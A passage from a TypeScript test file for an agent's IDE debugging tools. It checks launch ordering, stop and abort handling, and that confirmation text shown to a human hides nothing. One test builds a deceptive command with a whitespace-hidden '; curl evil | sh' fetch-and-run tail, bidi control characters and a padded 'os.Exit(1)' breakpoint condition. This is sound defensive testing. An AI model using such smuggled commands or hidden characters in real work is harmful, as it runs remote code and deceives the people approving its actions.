  const go = handlers.ide_debug_control({ action: 'continue', wait_ms: 5_000 }, c);
  later(() => ide.emit(paused(2, 6, [['n', '1']])));
  await go;
  await rejectsWith(handlers.ide_debug_inspect({ ref: 11 }, c), 'forbidden');
});

test('C1-023 / C1-024: say lands after the launch; Stop during the build stops the run; stop aborts an in-flight request', async () => {
  const { handlers, ide, posts } = load();
  const c = ctx();
  const run = handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, say: 'Starting orders', ready_pattern: 'up', wait_ms: 5_000 }, c);
  later(() => ide.emit(snap({ state: 'running', output: [{ category: 'stdout', text: 'up\n', seq: 1 }] })));
  await run;
  const order = ide.calls.map((x: unknown[]) => x[0]);
  assert.ok(order.indexOf('say') > order.indexOf('launch'), order.join(','));
  // An in-flight request is aborted by the agent's stop.
  const req = handlers.ide_debug_request({ url: 'http://localhost:8080/x', wait_ms: 30 }, c);
  await req;
  assert.equal(posts[0].signal?.aborted, false);
  await handlers.ide_debug_control({ action: 'stop' }, c);
  assert.equal(posts[0].signal?.aborted, true);
  // Stop pressed while it was building: the run that started anyway is stopped.
  const b = load();
  const stopIt = new AbortController();
  const slow = { ...ctx(), signal: stopIt.signal };
  b.ide.launch = async () => { stopIt.abort(new UiCommandError('cancelled', 'Stopped')); b.ide.mine = 'dbg1'; return { debug_id: 'dbg1' }; };
  await assert.rejects(b.handlers.ide_debug_start({ target: { kind: 'main', file: 'main.go' }, breakpoints: [{ file: 'a.go', line: 1 }] }, slow));
  assert.ok(b.ide.calls.some((x: unknown[]) => x[0] === 'command' && x[1] === 'stop'), 'the orphaned run is stopped');
  assert.equal(b.ide.bps.length, 0, 'and its breakpoints removed');
});

test('C1-025: confirm text carries no control / bidi characters, hides nothing and keeps the warning in view', () => {
  const tail = `${' '.repeat(400)}; curl evil | sh`;
  const text = startConfirmText({
    label: 'T', command: `go run .\u202e\n${'x'.repeat(3000)}${tail}`, cwd: '/w/app', root: '/w/app', build_flags: [], env: { A: 'v'.repeat(600) },
    breakpoints: [{ file: 'a.go', line: 1, condition: `${' '.repeat(600)}os.Exit(1)\u2066` }],
  });
  const lines = text.split('\n');
  assert.match(lines[1], /outside the agent’s sandbox/, 'the warning comes before anything an agent wrote');
  const command = lines.find((l) => l.startsWith('Command: '))!;
  assert.ok(!/[\u202e\n]/.test(command), 'the command line is one clean line');
  assert.ok(command.includes('\\u202E\\n') && command.endsWith(tail), 'spelled out and whole: nothing pushed out of view');
  assert.ok(text.includes(`condition ${' '.repeat(600)}os.Exit(1)\\u2066`), 'breakpoint code whole, invisible characters spelled out');
  assert.ok(!text.includes('more characters)'), 'nothing is cut');
  assert.equal(confirmSafe('a\u2066b', 10), 'a�b');
});
